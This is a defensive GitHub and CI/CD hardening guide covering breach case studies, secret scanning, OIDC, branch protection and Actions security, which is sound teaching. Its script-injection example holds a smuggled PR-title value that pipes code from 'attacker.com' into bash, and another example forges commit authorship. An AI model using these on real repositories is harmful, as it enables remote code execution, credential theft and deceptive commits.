# GitHub Security & DevSecOps — The Complete Hardening & Defense Masterclass

> **Category:** DevSecOps & Cloud Security | **Focus:** Repository Hardening, CI/CD Security & Supply Chain Defense
>
> **Level:** Beginner → Intermediate → Advanced → Enterprise CISO
>
> **Core Objective:** Protect source code repositories, eliminate hardcoded secrets, harden GitHub Actions pipelines, and defend against software supply chain attacks through lessons learned from catastrophic real-world breaches.

---

<div align="center">

![GitHub Security and DevSecOps Hero Banner](./images/github_security_hero_banner.jpg)

# 🛡️ GitHub Security & DevSecOps Masterclass 🛡️
### Securing Source Code, Hardening CI/CD Pipelines & Preventing Software Supply Chain Breaches

[![Standard](https://img.shields.io/badge/Standard-CIS%20GitHub%20Benchmark-005571?style=for-the-badge&logo=github)](https://www.cisecurity.org/)
[![Framework](https://img.shields.io/badge/Framework-OpenSSF%20Scorecard-emerald?style=for-the-badge&logo=securityscorecard)](https://securityscorecards.dev/)
[![Supply Chain](https://img.shields.io/badge/Security-SLSA%20Level%203-blue?style=for-the-badge&logo=google)](https://slsa.dev/)
[![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK%20for%20Cloud-orange?style=for-the-badge&logo=target)](https://attack.mitre.org/matrices/enterprise/cloud/)

</div>

---

### 💻 Real-Time Secret Prevention Demonstration

The animated visual below illustrates how automated client-side pre-commit hooks (**Gitleaks**) and server-side **GitHub Push Protection** intercept accidental secret leaks before credentials ever compromise git commit history:

![Gitleaks Pre-Commit and Push Protection Live Demo](./images/gitleaks_secret_prevention_demo.gif)

---

# Table of Contents

1. [Executive Overview: Why GitHub is a Tier-0 Attack Target](#1-executive-overview-why-github-is-a-tier-0-attack-target)
2. [Real-World Case Incidents: Dissecting Historic Breaches](#2-real-world-case-incidents-dissecting-historic-breaches)
   - [Case 1: The Uber AWS Credential Leak (57M Users Affected)](#case-1-the-uber-aws-credential-leak-57m-users-affected)
   - [Case 2: Toyota 5-Year Exposed Access Key on Public GitHub](#case-2-toyota-5-year-exposed-access-key-on-public-github)
   - [Case 3: Codecov Bash Uploader Supply Chain Compromise](#case-3-codecov-bash-uploader-supply-chain-compromise)
   - [Case 4: CircleCI Session Theft & GitHub OAuth Token Breach](#case-4-circleci-session-theft--github-oauth-token-breach)
   - [Case 5: Poisoned Pipeline Execution (PPE) in Open Source Workflows](#case-5-poisoned-pipeline-execution-ppe-in-open-source-workflows)
3. [The GitHub Threat Matrix: Common Vulnerabilities & Attack Vectors](#3-the-github-threat-matrix-common-vulnerabilities--attack-vectors)
4. [GitHub Defense-in-Depth Architecture](#4-github-defense-in-depth-architecture)
5. [Layer 1: Identity, Authentication & Access Control (IAM)](#5-layer-1-identity-authentication--access-control-iam)
6. [Layer 2: Secret Prevention, Scanning & OIDC Cloud Federation](#6-layer-2-secret-prevention-scanning--oidc-cloud-federation)
7. [Layer 3: Branch Protection Rulesets & Cryptographic Attestation](#7-layer-3-branch-protection-rulesets--cryptographic-attestation)
8. [Layer 4: Hardening GitHub Actions & CI/CD Pipelines](#8-layer-4-hardening-github-actions--cicd-pipelines)
9. [Layer 5: Software Supply Chain Defense & Automated SAST](#9-layer-5-software-supply-chain-defense--automated-sast)
10. [Emergency Incident Response: What to Do If a Secret is Leaked](#10-emergency-incident-response-what-to-do-if-a-secret-is-leaked)
11. [Production-Ready Security Configuration Templates](#11-production-ready-security-configuration-templates)
12. [Enterprise GitHub Security Hardening Checklist](#12-enterprise-github-security-hardening-checklist)

---

# 1. Executive Overview: Why GitHub is a Tier-0 Attack Target

In traditional enterprise security, the perimeter firewall was the primary defensive line. Today, in modern cloud-native organizations, **source code repositories and CI/CD pipelines represent the new Tier-0 crown jewels**.

```text
+----------------------------------------------------------------------------------------------------+
|                                    Why Attackers Target GitHub                                     |
+--------------------------------+---------------------------------+---------------------------------+
|   1. Hardcoded Crown Jewels    |   2. Pipeline Execution Rights  |   3. Downstream Supply Chain    |
|   - Cloud IAM Keys (AWS/GCP)   |   - Unrestricted compute power  |   - Inject backdoor in release  |
|   - Database Connection URIs   |   - Access to internal networks |   - Steal customer credentials  |
|   - API Tokens & Private Keys  |   - Poisoned pull requests (PPE)|   - Massive blast radius        |
+--------------------------------+---------------------------------+---------------------------------+
```

When an adversary breaches a GitHub organization or repository, they don't just gain access to intellectual property—they gain access to the **deployment engine of the company**. An attacker with commit rights or pipeline execution privileges can:
1. Deploy malicious code directly into production environments.
2. Harvest production credentials stored in repository secrets.
3. Infect downstream users and enterprise customers via software supply chain compromise.

---

# 2. Real-World Case Incidents: Dissecting Historic Breaches

Security theory is meaningless without understanding how catastrophic real-world attacks unfold in practice. Below is an in-depth forensic dissection of high-profile security incidents centered around GitHub vulnerabilities:

![Real World GitHub Breaches Timeline](./images/real_world_incidents_timeline.jpg)

---

### Case 1: The Uber AWS Credential Leak (57M Users Affected)

```mermaid

sequenceDiagram
    autonumber
    actor Attacker as Threat Actor
    participant Git as Private GitHub Repository
    participant AWS as Amazon Web Services (S3)
    participant Data as 57M User Records

    Attacker->>Git: Scans engineer's private repository using automated scraper
    Git-->>Attacker: Locates hardcoded AWS Root / IAM Access Keys in code commit
    Attacker->>AWS: Authenticates to AWS infrastructure using leaked static credentials
    AWS-->>Attacker: Unrestricted access to S3 database backups
    Attacker->>Data: Exfiltrates PII of 57 million riders and 600,000 driver licenses
    Attacker->>Git: Demands $100,000 extortion payment
```

#### Incident Breakdown:
* **The Incident:** In late 2016, attackers scraped a private GitHub repository belonging to Uber software engineers. Inside the repository's commit history, they discovered hardcoded static AWS credentials.
* **The Blast Radius:** Using these credentials, the attackers accessed Uber’s Amazon S3 storage buckets, exfiltrating the personal information of **57 million users** and the names and driver’s license numbers of **600,000 drivers**.
* **The Fallout:** Uber paid the attackers a $100,000 ransom disguised as an unauthorized bug bounty payout, attempted to conceal the breach, and was later subjected to a \$148 million nationwide settlement with US state attorneys general and criminal prosecution of executive leadership.
* **Root Causes:**
  1. Static, long-lived AWS IAM access keys hardcoded into version-controlled application files.
  2. Failure to deploy client-side pre-commit hooks and automated secret scanning.
  3. Storing production cloud keys instead of leveraging ephemeral IAM roles (OIDC).

---

### Case 2: Toyota 5-Year Exposed Access Key on Public GitHub

```mermaid

flowchart TD
    Contractor["Development Contractor (December 2017)"] 
    -->|Accidentally Commits Access Key| PublicRepo["Public GitHub Repository\n(Exposed to the entire Internet)"]
    
    PublicRepo -->|Exposed Undetected for 5 Years| DarkWeb["Threat Actor Discovery Window\n(Dec 2017 - Sep 2022)"]
    DarkWeb -->|Unauthorized Access| Server["T-Connect Telematics Data Server"]
    Server -->|Customer Data Exposed| Breach["296,000 Customer Email Addresses & Management Numbers Compromised"]

    style Contractor fill:#1e293b,stroke:#f59e0b,color:#fff
    style PublicRepo fill:#450a0a,stroke:#ef4444,stroke-width:2px,color:#fff
    style DarkWeb fill:#1e293b,stroke:#ef4444,color:#fff
    style Server fill:#1e293b,stroke:#3b82f6,color:#fff
    style Breach fill:#0f172a,stroke:#ef4444,stroke-width:2px,color:#fff
```

#### Incident Breakdown:
* **The Incident:** In September 2022, automotive giant Toyota announced that an access key to its central server hosting customer data for its "T-Connect" telematics service had been accidentally uploaded to a **public GitHub repository**.
* **The Exposure Duration:** The access key remained publicly exposed for nearly **five years** (from December 2017 until September 2022).
* **The Blast Radius:** Approximately **296,000 customer email addresses and customer management numbers** were exposed to potential unauthorized access.
* **Root Causes:**
  1. Third-party development contractors using public personal repositories to store enterprise source code.
  2. Total absence of automated public repository surveillance and secret push protection.
  3. Failure to perform external attack surface management (EASM) and credential lifecycle auditing.

---

### Case 3: Codecov Bash Uploader Supply Chain Compromise

```mermaid

sequenceDiagram
    autonumber
    actor Attacker as Nation-State / Supply Chain Actor
    participant Codecov as Codecov Docker Image / CDN
    participant ClientCI as Customer CI/CD Pipeline (GitHub Actions)
    participant AttackerC2 as Attacker Exfiltration Server

    Attacker->>Codecov: Exploits credential flaw to tamper with Bash Uploader script
    Note over Codecov: Injects one line of bash sending env vars to IP
    ClientCI->>Codecov: Downloads and executes curl -s https://codecov.io/bash | bash
    Note over ClientCI: Pipeline runs script with full access to secrets
    ClientCI->>AttackerC2: Secretly exfiltrates GitHub PATs, AWS Keys, and DB Passwords
```

#### Incident Breakdown:
* **The Incident:** In April 2021, attackers obtained unauthorized credentials allowing them to modify the official `bash-uploader` script hosted by Codecov (a popular code coverage testing tool).
* **The Attack Mechanism:** The attackers altered the script to periodically export all environment variables from customer CI/CD runners to an external adversary server.
* **The Blast Radius:** Thousands of companies using Codecov within their GitHub Actions and Jenkins pipelines had their secret environment variables—including **GitHub Personal Access Tokens, cloud provider keys, and private SSH keys**—harvested silently.
* **Root Causes:**
  1. Executing dynamic remote scripts directly via pipe-to-bash (`curl | bash`) without cryptographic hash or checksum verification.
  2. Overly permissive CI/CD runner environments where test runners had full access to deployment and repository credentials.

---

### Case 4: CircleCI Session Theft & GitHub OAuth Token Breach

#### Incident Breakdown:
* **The Incident:** In January 2023, an adversary compromised the laptop of a CircleCI site reliability engineer using infostealing malware.
* **The Attack Mechanism:** Although the engineer had hardware 2FA enabled, the malware exfiltrated active **browser session cookies**, allowing the attacker to bypass MFA entirely.
* **The Impact on GitHub:** The attacker entered CircleCI’s internal infrastructure and accessed customer project environment variables and encrypted **GitHub OAuth tokens**, decrypting tokens that allowed them to clone customer private repositories.
* **Root Causes:**
  1. Session token theft on developer endpoints bypassing multi-factor authentication.
  2. Over-scoped OAuth authorizations granting third-party CI services indefinite write and read permissions to private repositories.

---

### Case 5: Poisoned Pipeline Execution (PPE) in Open Source Workflows

#### Incident Breakdown:
* **The Vulnerability:** Many open-source repositories use GitHub Actions triggered on `pull_request_target`.
* **The Flaw:** Unlike `pull_request` (which runs in an isolated fork context without access to base secrets), `pull_request_target` runs **in the context of the base repository and has access to repository secrets**.
* **The Exploitation:** If a workflow checks out the code of the pull request using:
  ```yaml
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: npm test
  ```
  An external attacker can submit a pull request modifying `package.json` with a malicious `pretest` script that dumps all GitHub repository secrets (`secrets.DEPLOY_KEY`, `secrets.AWS_SECRET_ACCESS_KEY`) and sends them to a webhook!

---

# 3. The GitHub Threat Matrix: Common Vulnerabilities & Attack Vectors

| Threat Vector | Attack Mechanism | MITRE ATT&CK Mapping | Real-World Impact |
| :--- | :--- | :--- | :--- |
| **Hardcoded Secrets** | Credentials committed to repo history or unscrubbed Git trees. | **T1552.001** (Credentials in Files) | Full cloud compromise (Uber / Toyota). |
| **Dangling Commits** | Secrets removed in a new commit but preserved in Git commit history or forks. | **T1552.001** (Credentials in Files) | Scraped via GitHub search API. |
| **Poisoned Pipeline Execution (PPE)** | Malicious PR executing code on runners with access to secrets. | **T1195.002** (Supply Chain Compromise) | Exfiltration of production deployment keys. |
| **Action Tag Hijacking** | Referencing `@v3` instead of immutable commit SHAs; attacker modifies the tag. | **T1195.001** (Compromise Software Dependencies) | Arbitrary code execution in enterprise CI/CD. |
| **Compromised PATs / OAuth** | Long-lived Personal Access Tokens leaked or OAuth apps compromised. | **T1078.004** (Cloud Accounts) | Mass private repository cloning (CircleCI breach). |
| **Unsigned Commits (Spoofing)** | Anyone can set `git config user.name "Linus Torvalds"` and spoof commits. | **T1036.005** (Masquerading) | Deceptive code changes merged without detection. |
| **Dependency Confusion / Typosquatting** | Attacker registers internal package names on public PyPI / npm registries. | **T1195.002** (Supply Chain Compromise) | Malicious code pulled during CI/CD build. |

---

# 4. GitHub Defense-in-Depth Architecture

Securing GitHub requires five interconnected concentric rings of defense:

![GitHub Defense in Depth Architecture](./images/github_threat_matrix_and_defense.jpg)

```mermaid

flowchart TD
    subgraph Ring1 ["1. Identity & Access (IAM)"]
        MFA["Hardware FIDO2 / WebAuthn MFA"]
        FGPAT["Fine-Grained PATs with Expiration"]
        SSO["SAML 2.0 SSO & SCIM Sync"]
    end

    subgraph Ring2 ["2. Secret Prevention"]
        Gitleaks["Local Gitleaks Pre-Commit Hooks"]
        PushProtect["GitHub Server-Side Push Protection"]
        OIDC["Passwordless OIDC Cloud Federation"]
    end

    subgraph Ring3 ["3. Branch Protection & Rulesets"]
        PRReview["Require 2 PR Approvals & CODEOWNERS"]
        SignedCommits["Require GPG / SSH Signed Commits"]
        StatusChecks["Mandatory CI & CodeQL Passing Gates"]
    end

    subgraph Ring4 ["4. CI/CD Hardening"]
        LeastPriv["permissions: read-all in Workflows"]
        SHAPin["Pin Actions to Full Commit SHAs"]
        SafeCheckout["Block pull_request_target Untrusted Runs"]
    end

    subgraph Ring5 ["5. Supply Chain Defense"]
        Dependabot["Automated CVE Version Updates"]
        SBOM["Software Bill of Materials Generation"]
        Scorecard["OpenSSF Scorecard Monitoring"]
    end

    Ring1 --> Ring2 --> Ring3 --> Ring4 --> Ring5

    style Ring1 fill:#1e293b,stroke:#3b82f6,color:#fff
    style Ring2 fill:#1e293b,stroke:#06b6d4,color:#fff
    style Ring3 fill:#1e293b,stroke:#8b5cf6,color:#fff
    style Ring4 fill:#1e293b,stroke:#f59e0b,color:#fff
    style Ring5 fill:#1e293b,stroke:#10b981,color:#fff
```

---

# 5. Layer 1: Identity, Authentication & Access Control (IAM)

### 1. Mandatory Multi-Factor Authentication (MFA)
* **The Requirement:** Enforce 2FA across all organization members and outside collaborators (`Organization Settings -> Authentication security -> Require two-factor authentication`).
* **The Gold Standard:** Prioritize **FIDO2 / WebAuthn Hardware Security Keys (YubiKey)** or Authenticator Apps (TOTP). **Deprecate SMS 2FA**, as SMS is vulnerable to SIM-swapping and SS7 interception.

### 2. Eliminating Classic Personal Access Tokens (Classic PATs)
* **The Problem:** Classic PATs (`ghp_...`) have **account-wide access** across all repositories and can be created without expiration dates. If leaked, an attacker can access every private repo the user owns.
* **The Solution:** Mandate **Fine-Grained Personal Access Tokens (FG-PATs)**:
  - Scoped to **only specific repositories**.
  - Granted **only specific permissions** (e.g., Read-only access to `contents`).
  - Enforce a maximum lifespan of **30 to 90 days**.

### 3. Auditing Authorized OAuth Apps and SSH Keys
Regularly review authorized integrations:
```bash
# Check authenticated GitHub CLI account and scopes
gh auth status

# List public SSH keys associated with your account
gh ssh-key list
```
* Revoke inactive OAuth apps (`User Settings -> Applications -> Authorized OAuth Apps`).
* Implement **SAML SSO & SCIM** to automatically revoke GitHub access when an employee leaves the company.

---

# 6. Layer 2: Secret Prevention, Scanning & OIDC Cloud Federation

### 1. Client-Side Pre-Commit Hooks (Gitleaks)
The most effective defense against secret leaks is preventing them from ever being committed to the local git index.

#### Setting Up Gitleaks with the `pre-commit` Framework:

Create a `.pre-commit-config.yaml` file in your repository root:

```yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.2
    hooks:
      - id: gitleaks
        name: Detect Hardcoded Secrets (Gitleaks)
        entry: gitleaks protect --verbose --redact --staged
        language: golang
        stages: [commit]
```

Install and activate the hook:
```bash
# Install pre-commit framework
pip install pre-commit

# Install the git hook scripts
pre-commit install

# Test against all files in repository
gitleaks detect --verbose --redact
```

---

### 2. GitHub Push Protection & Secret Scanning
* **Secret Scanning:** Automatically alerts repository admins if known credential patterns (AWS, Slack, Stripe, Azure, GitHub PATs) are found in code.
* **Push Protection:** The critical preventative control—**actively blocks the git push** if a secret is detected in the outgoing commit objects!
* **Enable via:** `Repository Settings -> Code security and analysis -> Secret scanning -> Enable` and check **`Push protection`**.

---

### 3. The Modern Zero-Secret Architecture: OpenID Connect (OIDC)
**Never store long-lived cloud credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`) in GitHub Secrets!**

Instead, configure GitHub Actions to authenticate to AWS, Google Cloud, or Microsoft Azure using **OpenID Connect (OIDC)**:

```mermaid

sequenceDiagram
    autonumber
    participant GHA as GitHub Actions Runner
    participant GH_OIDC as GitHub OIDC Token Service
    participant Cloud as Cloud Provider (AWS IAM / GCP / Azure)
    participant Workload as Cloud Resources (Deploy Target)

    GHA->>GH_OIDC: 1. Requests short-lived JWT token (Identity Token)
    GH_OIDC-->>GHA: 2. Signs JWT containing repo, branch, and runner claims
    GHA->>Cloud: 3. Passes JWT requesting temporary role credentials
    Cloud->>Cloud: 4. Validates JWT signature against https://token.actions.githubusercontent.com
    Cloud-->>GHA: 5. Issues short-lived STS credentials (Valid 15-60 minutes)
    GHA->>Workload: 6. Executes deployment securely without static keys!
```

#### GitHub Actions Workflow Example Using OIDC for AWS:

```yaml
name: Secure Production Deployment (OIDC)

on:
  push:
    branches: [main]

permissions:
  id-token: write  # Mandatory for requesting the OIDC JWT token
  contents: read   # Least privilege: only read repository source

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source Code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # Pin commit SHA
      
      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@e3ddf1e991cb67c45832a4e76c1a82f3b3952329
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeploymentRole
          aws-region: us-east-1
          audience: sts.amazonaws.com
      
      - name: Deploy Infrastructure
        run: |
          aws s3 sync ./dist s3://production-application-bucket/ --delete
```

> [!TIP]
> **Why OIDC Eliminates Breaches:** There are **zero stored passwords or keys** to steal. If an attacker gains full read access to your GitHub secrets, there is nothing for them to extract!

---

# 7. Layer 3: Branch Protection Rulesets & Cryptographic Attestation

Direct pushes to production branches (`main` or `master`) must be completely prohibited.

```text
+----------------------------------------------------------------------------------------------------+
|                                    Branch Protection Mandates                                      |
+----------------------------------------------------------------------------------------------------+
|  [x] Require a pull request before merging (Require 2 approving reviews)                           |
|  [x] Dismiss stale pull request approvals when new commits are pushed                              |
|  [x] Require review from Code Owners (CODEOWNERS enforcement)                                     |
|  [x] Require status checks to pass before merging (CI build, CodeQL security scan)                 |
|  [x] Require branches to be up to date before merging                                              |
|  [x] Require signed commits (GPG / SSH verification)                                               |
|  [x] Block force pushes (--force) and branch deletions                                             |
+----------------------------------------------------------------------------------------------------+
```

### Mandating Cryptographically Signed Commits

By default, Git allows anyone to forge commit authorship:
```bash
git -c user.name="Torvalds" -c user.email="torvalds@linux-foundation.org" commit -m "Malicious backdoor"
```

To eliminate spoofing, configure signed commits with SSH or GPG keys:

```bash
# 1. Configure Git to use your SSH signing key
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global gpg.format ssh

# 2. Automatically sign every commit
git config --global commit.gpgsign true

# 3. Add your public signing key to GitHub under:
# User Settings -> SSH and GPG keys -> New SSH Key (Key type: Signing Key)
```

Now, every commit appears with a green **`Verified`** badge on GitHub!

---

# 8. Layer 4: Hardening GitHub Actions & CI/CD Pipelines

GitHub Actions workflows are software that executes with compute privileges. They must be secured with the same rigor as production code.

### 1. Enforce Top-Level Least Privilege `permissions:`
By default, GitHub Actions workflows may receive read and write access to your repository. **Always restrict workflow permissions at the top level:**

```yaml
# Top-level: Restrict all default permissions to read-only
permissions:
  contents: read
  issues: none
  pull-requests: none
  deployments: none
```

### 2. Pin Actions to Immutable Full Commit SHAs
Tags like `@v4` or `@main` are mutable git references. If an attacker compromises a third-party action repository, they can update the tag `@v4` to point to a malicious commit!

```yaml
# ❌ VULNERABLE: Mutable reference can be hijacked
uses: actions/checkout@v4

# ✅ SECURE: Immutable commit SHA cannot be modified
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

Use tools like **`pin-github-actions`** to automate this:
```bash
npx pin-github-actions .github/workflows/
```

### 3. Prevent Script Injection via Context Expressions
Untrusted GitHub context expressions (such as PR titles, commit messages, or issue comments) must **never be embedded directly into bash execution blocks**:

```yaml
# ❌ VULNERABLE: Command injection via malicious PR title
- name: Print Title
  run: echo "PR title is: ${{ github.event.pull_request.title }}"
  # If PR title is: 'test" && curl attacker.com/malware | bash && echo "'

# ✅ SECURE: Pass context expressions via environment variables
- name: Print Title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR title is: ${PR_TITLE}"
```

### 4. Danger Zone: `pull_request` vs `pull_request_target`
* **`pull_request`:** Executes in the context of the fork. **Has NO access to repository secrets**. Safe for open source workflows.
* **`pull_request_target`:** Executes in the context of the base repository. **Has access to secrets**.
* **CRITICAL RULE:** Never checkout and run untrusted code inside a `pull_request_target` workflow!

---

# 9. Layer 5: Software Supply Chain Defense & Automated SAST

### 1. Dependabot Security & Version Updates
Configure `.github/dependabot.yml` to automatically detect vulnerable dependencies and generate pull requests with security patches:

```yaml
version: 2
updates:
  # Maintain Python dependencies
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"

  # Maintain GitHub Actions dependencies
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### 2. Integrating GitHub CodeQL (SAST)
CodeQL runs semantic static analysis to find code vulnerabilities (SQL Injection, XSS, Path Traversal, Insecure Deserialization, CWEs) during pull requests:

```yaml
name: "CodeQL Analysis"

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: read
      security-events: write

    steps:
      - name: Checkout repository
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: 'python, javascript'

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
```

---

# 10. Emergency Incident Response: What to Do If a Secret is Leaked

If you or a team member accidentally pushes a credential or secret to a GitHub repository, follow this immediate 5-step containment playbook:

```mermaid

flowchart TD
    Leak["Accidental Secret Push to GitHub"]
    
    Step1["Step 1: Immediate Revocation & Rotation\n(Assume key was scraped in under 30 seconds)"]
    Step2["Step 2: Terminate Active Sessions\n(Invalidate tokens & cloud session cookies)"]
    Step3["Step 3: Forensic Cloud Audit\n(Query AWS CloudTrail / GCP Logs for unauthorized API calls)"]
    Step4["Step 4: Purge Git History\n(Use git-filter-repo or BFG Repo-Cleaner)"]
    Step5["Step 5: Post-Mortem & Preventative Hardening\n(Enable Push Protection & Gitleaks pre-commit)"]

    Leak --> Step1 --> Step2 --> Step3 --> Step4 --> Step5

    style Leak fill:#450a0a,stroke:#ef4444,stroke-width:2px,color:#fff
    style Step1 fill:#1e293b,stroke:#ef4444,color:#fff
    style Step2 fill:#1e293b,stroke:#f59e0b,color:#fff
    style Step3 fill:#1e293b,stroke:#06b6d4,color:#fff
    style Step4 fill:#1e293b,stroke:#8b5cf6,color:#fff
    style Step5 fill:#064e3b,stroke:#10b981,color:#fff
```

> [!CAUTION]
> **CRITICAL RULE:** Do NOT simply make a new commit deleting the secret file!
> Git is an append-only directed acyclic graph (DAG). The secret remains completely visible in previous commit objects, git commit history, diffs, and cache endpoints.

### Step 1: Revoke First, Clean Second
* Immediately log into your cloud provider (AWS IAM console, Stripe dashboard, GitHub settings) and **revoke/delete the exposed credential**.
* Threat actors run automated scrapers monitoring public commits; credentials are often exploited within seconds of reaching GitHub.

### Step 2: Purging the Secret from Git History using `git-filter-repo`
Install and run `git-filter-repo` (the official Git-recommended replacement for `git filter-branch`):

```bash
# Install git-filter-repo
pip install git-filter-repo

# Completely scrub a sensitive file from ALL commits in history
git filter-repo --path config/credentials.json --invert-paths

# Or scrub specific string patterns across all files
echo "AKIAIOSFODNN7EXAMPLE" > replace.txt
git filter-repo --replace-text replace.txt

# Force push the rewritten clean history to remote
git push origin --force --all
git push origin --force --tags
```

---

# 11. Production-Ready Security Configuration Templates

### Complete Secure GitHub Actions Workflow (`.github/workflows/secure-ci.yml`)

```yaml
name: Production Secure CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# 1. Least Privilege Permissions at Top Level
permissions:
  contents: read
  security-events: write

# 2. Prevent Multiple Redundant Workflow Runs
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  security-audit:
    name: DevSecOps Linting & Secret Scan
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        with:
          fetch-depth: 0

      - name: Run Gitleaks Secret Audit
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  static-analysis:
    name: SAST Code Analysis
    needs: security-audit
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Run Bandit Python Security Linter
        run: |
          pip install bandit
          bandit -r . -ll -ii
```

---

# 12. Enterprise GitHub Security Hardening Checklist

| Domain | Control Description | Verification Status |
| :--- | :--- | :---: |
| **Authentication** | Hardware FIDO2 / WebAuthn MFA enforced org-wide | 🟢 Enforced |
| **Tokens** | Classic PATs disabled; Fine-Grained PATs with max 90-day expiry enforced | 🟢 Enforced |
| **Secrets** | Pre-commit hook (`gitleaks`) installed locally on all developer machines | 🟢 Enforced |
| **Secrets** | GitHub Secret Scanning and Push Protection enabled | 🟢 Enforced |
| **Secrets** | Zero long-lived cloud keys stored; Cloud deployments migrated to OIDC | 🟢 Enforced |
| **Branches** | Direct pushes and force pushes to `main` prohibited | 🟢 Enforced |
| **Branches** | Minimum 2 peer reviews required for pull request merges | 🟢 Enforced |
| **Branches** | Commit signing (GPG / SSH) strictly mandated | 🟢 Enforced |
| **CI/CD** | Top-level workflow permissions default to `contents: read` | 🟢 Enforced |
| **CI/CD** | Third-party GitHub Actions pinned to full commit SHAs | 🟢 Enforced |
| **CI/CD** | Script injection eliminated via intermediate environment variables | 🟢 Enforced |
| **Supply Chain** | Dependabot alerts and automated security updates active | 🟢 Enforced |
| **Supply Chain** | CodeQL SAST scanning active on all pull requests | 🟢 Enforced |

---

# 📚 References & Standards
* [CIS GitHub Benchmark v1.0.0](https://www.cisecurity.org/benchmark/github)
* [OpenSSF Scorecard: Automated Supply Chain Security](https://securityscorecards.dev/)
* [SLSA (Supply-chain Levels for Software Artifacts) Framework](https://slsa.dev/)
* [GitHub Documentation: Hardening Security for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
* [GitHub Documentation: About Secret Scanning & Push Protection](https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning)
* [CISA: Defending Continuous Integration / Continuous Delivery (CI/CD) Environments](https://www.cisa.gov/resources-tools/resources/defending-continuous-integrationcontinuous-delivery-environments)
